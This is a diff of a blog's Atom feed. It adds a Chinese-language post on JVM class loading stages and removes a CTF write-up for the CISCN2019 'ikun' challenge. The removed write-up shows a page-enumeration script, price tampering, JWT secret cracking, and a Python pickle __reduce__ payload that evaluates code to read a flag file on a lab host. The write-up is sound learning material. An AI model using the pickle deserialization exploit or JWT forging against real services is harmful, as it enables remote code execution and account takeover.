@@ -6,7 +6,7 @@
   <link href="http://yoursite.com/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-11-25T11:35:51.910Z</updated>
+  <updated>2020-11-25T11:43:46.634Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Java虚拟机之类加载机制</title>
+    <link href="http://yoursite.com/2020/11/25/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
+    <id>http://yoursite.com/2020/11/25/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</id>
+    <published>2020-11-25T11:42:53.000Z</published>
+    <updated>2020-11-25T11:43:46.634Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="文件格式验证"><a href="#文件格式验证" class="headerlink" title="文件格式验证"></a>文件格式验证</h3><p>这阶段的验证是基于二进制字节流进行的，只有通过了这个验证，这段字节流才允许进入Java虚拟机内存的方法区中进行存储。</p><h3 id="元数据验证"><a href="#元数据验证" class="headerlink" title="元数据验证"></a>元数据验证</h3><p>对字节码描述的信息进行语义分析，主要是对类的元数据信息进行语义校验。</p><h3 id="字节码验证"><a href="#字节码验证" class="headerlink" title="字节码验证"></a>字节码验证</h3><p>主要目的是通过数据流分析和控制流分析，确定语义是合法的、符合逻辑的。</p><p>这个阶段对类的方法体（即Class文件的code属性）进行校验分析。</p><p>JDK6以后，Javac编译器和Java虚拟进行了联合优化，尽可能多的校验辅助措施挪到了Javac编译器进行。</p><p>具体表现是Code属性中多了一个<code>StackMapTable</code>的新属性。</p><h3 id="符号引用验证"><a href="#符号引用验证" class="headerlink" title="符号引用验证"></a>符号引用验证</h3><p>发生在虚拟机将符号引用转化为直接引用的时候，这个转化将在连接的第三阶段，即<strong>解析</strong>阶段完成的。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>准备阶段是正式为类中定义的变量（static）分配内存并设置变量初始值的阶段。</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;验证&quot;&gt;&lt;a href=&quot;#验证&quot; class=&quot;headerlink&quot; title=&quot;验证&quot;&gt;&lt;/a&gt;验证&lt;/h2&gt;&lt;h3 id=&quot;文件格式验证&quot;&gt;&lt;a href=&quot;#文件格式验证&quot; class=&quot;headerlink&quot; title=&quot;文件格式验证&quot;&gt;&lt;/a&gt;文</summary>
+      
+    
+    
+    
+    <category term="Something" scheme="http://yoursite.com/categories/Something/"/>
+    
+    
+    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
+    
+    <category term="JVM" scheme="http://yoursite.com/tags/JVM/"/>
+    
+  </entry>
   
   <entry>
     <title>Java之RMI简单总结</title>
@@ -453,35 +479,6 @@
     
     
     <category term="flask session" scheme="http://yoursite.com/tags/flask-session/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>刷题记录[CISCN2019 华北赛区 Day1 Web2]ikun</title>
-    <link href="http://yoursite.com/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/"/>
-    <id>http://yoursite.com/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/</id>
-    <published>2020-03-31T08:43:18.000Z</published>
-    <updated>2020-03-31T10:06:00.328Z</updated>
-    
-    <content type="html"><![CDATA[<p>进来看完ctrl的kunkun，hint说要买lv6</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/1.png"></p><p>显然是一个跑目录的操作，这里可以看出直接找lv6.png这个图片就行，写个小脚本爆出来（贼慢，带点耐心）</p> <a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://3162c274-c0d1-413f-9dc2-1395d15911c5.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">999</span>):</span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来是181页，直接访问</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/2.png"></p><p>显然是买不起，抓个包试试有无逻辑漏洞</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/3.png"></p><p>就这俩参数，改改看，（改折扣为一个很小的数就可以过）</p><p>进去之后需要admin，先给抓个包康康，发现有JWT，先丢进 <a href="https://www.jsonwebtoken.io/">https://www.jsonwebtoken.io/</a> 里面看看</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/4.png"></p><p>对用户名进行替换，这里需要一个<a href="https://github.com/brendan-rius/c-jwt-cracker">JWT的工具</a></p><p>可以直接跑出key</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/5.png"></p><p>然后如图所示构造JWT，发包，通过。</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/6.png"></p><p>通过后在页面源码里找到一个下载地址，把源码下载到手，进行分析</p><p>因为有提示是pickle，直接搜，在Admin.py里面有一个pickle.load()，没有任何过滤的情况下，直接reduce一把梭</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>这里用了python2，因为用python3的结果和python2不一样（之后队友告诉我因为python2用的0号协议，而python3是3号协议，tql）</p><p>flag到手</p><p><img src= "/img/loading.gif" data-lazy-src="/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/7.png"></p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;进来看完ctrl的kunkun，hint说要买lv6&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2020/03/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/1.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;显然是一个跑目录的操作，这里可以看出直接找lv6.png这个图片就行，写个小脚本爆出来（贼慢，带点耐心）&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
-    
-    
-    <category term="pickle" scheme="http://yoursite.com/tags/pickle/"/>
-    
-    <category term="逻辑漏洞" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
-    
-    <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
-    <category term="JWT" scheme="http://yoursite.com/tags/JWT/"/>
     
   </entry>
   
